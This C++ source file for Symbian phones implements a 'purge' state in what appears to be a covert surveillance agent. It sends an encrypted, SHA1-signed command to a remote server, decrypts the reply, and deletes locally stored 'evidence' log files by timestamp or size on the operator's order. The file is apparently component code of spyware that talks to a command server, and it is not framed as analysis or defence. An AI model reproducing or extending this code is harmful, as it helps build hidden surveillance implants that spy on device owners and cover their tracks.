/*
 * StatePurge.cpp
 *
 *  Created on: 11/gen/2013
 *      Author: Giovanna
 */

#include "StatePurge.h"

#include "Keys.h"
#include <HT\FileUtils.h>
#include <HT\ShaUtils.h>
#include <HT\AES.h>
#include <HT\RESTUtils.h>
#include <HT\TimeUtils.h>

CStatePurge::CStatePurge(MStateObserver& aObserver) :
	CAbstractState(EState_NewConf, aObserver)
	{
	// No implementation required
	}

CStatePurge::~CStatePurge()
	{
	iFileList.ResetAndDestroy();
	iFileList.Close();
	delete iRequestData;
	delete iResponseData;
	}

CStatePurge* CStatePurge::NewLC(MStateObserver& aObserver)
	{
	CStatePurge* self = new (ELeave) CStatePurge(aObserver);
	CleanupStack::PushL(self);
	self->ConstructL();
	return self;
	}

CStatePurge* CStatePurge::NewL(MStateObserver& aObserver)
	{
	CStatePurge* self = CStatePurge::NewLC(aObserver);
	CleanupStack::Pop(); // self;
	return self;
	}

void CStatePurge::ConstructL()
	{
	}

void CStatePurge::ActivateL(const TDesC8& aData)
	{
	// Parameter aData stores the K key
	iSignKey.Copy(aData);
	
	TBuf8<32> plainBody;
	//append command
	plainBody.Copy(KProto_Purge);
	//calculate SHA1
	TBuf8<20> sha;
	ShaUtils::CreateSha(plainBody,sha);
	//append SHA1
	plainBody.Append(sha);
	//encrypt 
	RBuf8 buff(AES::EncryptPkcs5L(plainBody, KIV, iSignKey));
	buff.CleanupClosePushL();
	
	//add REST header
	HBufC8* header = iObserver.GetRequestHeaderL();
	TBuf8<32> contentLengthLine;
	contentLengthLine.Append(KContentLength);
	contentLengthLine.AppendNum(buff.Size());
	contentLengthLine.Append(KNewLine);
	iRequestData = HBufC8::NewL(header->Size()+contentLengthLine.Size()+KNewLine().Size()+buff.Size());
	iRequestData->Des().Append(*header);
	delete header;
	iRequestData->Des().Append(contentLengthLine);
	iRequestData->Des().Append(KNewLine);
	iRequestData->Des().Append(buff);
	CleanupStack::PopAndDestroy(&buff);
	//send
	iObserver.SendStateDataL(*iRequestData);
	}

void CStatePurge::ProcessDataL(const TDesC8& aData)
	{
	//free resources
	delete iRequestData;
	iRequestData = NULL;
	
	if(aData.Size()!=0)
		{
		if(iResponseData == NULL)
			{
			iResponseData = aData.AllocL();
			}
		else
			{
			TInt size = iResponseData->Size();
			iResponseData = iResponseData->ReAllocL(size+aData.Size()); //TODO:check this
			iResponseData->Des().Append(aData);
			}
		return;
		}
	
	if(iResponseData == NULL)
		{
		//connection has been closed by server withouth sending anything
		iObserver.ChangeStateL(KErrNotOk);
		return;
		}

	if(iResponseData->Find(KApplicationOS)==KErrNotFound)
		{
		if(iResponseData->Find(KBinaryOS)==KErrNotFound)
			{
			//server answered with a redirect
			iObserver.ResponseError(KErrContent);
			return;
			}
		}
		
	//extract body from response
	RBuf8 body(CRestUtils::GetBodyL(*iResponseData));
	body.CleanupClosePushL();
	//decrypt	
	RBuf8 plainBody(AES::DecryptPkcs5L(body,KIV,iSignKey));
	CleanupStack::PopAndDestroy(&body);
	plainBody.CleanupClosePushL();
	
	//check sha1
	if(!ShaUtils::ValidateSha(plainBody.Left(plainBody.Size()-20),plainBody.Right(20)))
		{
		CleanupStack::PopAndDestroy(&plainBody);
		iObserver.ResponseError(KErrSha);
		return;
		}
	//check response		
	if(plainBody.Left(4).Compare(KProto_Ok) == 0)
		{
		DeleteEvidencesL(plainBody.Right(plainBody.Size()-8)); //8=KProto_Ok|len
		}
	CleanupStack::PopAndDestroy(&plainBody);
	iObserver.ChangeStateL(KErrNone);
	}


void CStatePurge::DeleteEvidencesL(const TDesC8& aParams)
	{
	// retrieve date
	TUint8* ptr = (TUint8 *)aParams.Ptr();
	TUint64 timestamp = 0;   				
	Mem::Copy(&timestamp, ptr, 8);
	ptr += sizeof(TUint64);
	TInt64 date = TimeUtils::GetSymbianTimeFromUnix(timestamp);
	// retrieve size
	TUint32 size = 0;
	Mem::Copy(&size, ptr, 4);
	// list files
	RFs fs;
	TInt error = fs.Connect();
	if(error == KErrNone)
		{
		TFullName path;
		FileUtils::CompleteWithPrivatePathL(fs, path);
		path.Append(_L("*.log"));
		FileUtils::ListFilesInDirectoryL(fs, path, iFileList);
		
		TInt count = iFileList.Count();
		if(timestamp > 0)
			{
			//delete files based on their timestamp
			for(TInt i=0;i<count;i++)
				{
				HBufC* fileName = iFileList[i];
				TInt64 modifiedTime = FileUtils::GetFileModified(fs, *fileName);
				if(modifiedTime < date)
					{
					fs.Delete(*fileName);  //ignore if file not exists (anymore)
					}
				}
			}
		if(size >0)
			{
			//delete files based on their size
			for(TInt i=0;i<count;i++)
				{
				HBufC* fileName = iFileList[i];
				TUint32 fileSize = FileUtils::GetFileSize(fs, *fileName);
				if(fileSize > size)
					{
					fs.Delete(*fileName);  //ignore if file not exists (anymore)
					}
				}
			}
		fs.Close();
		}
	iFileList.ResetAndDestroy();
	}
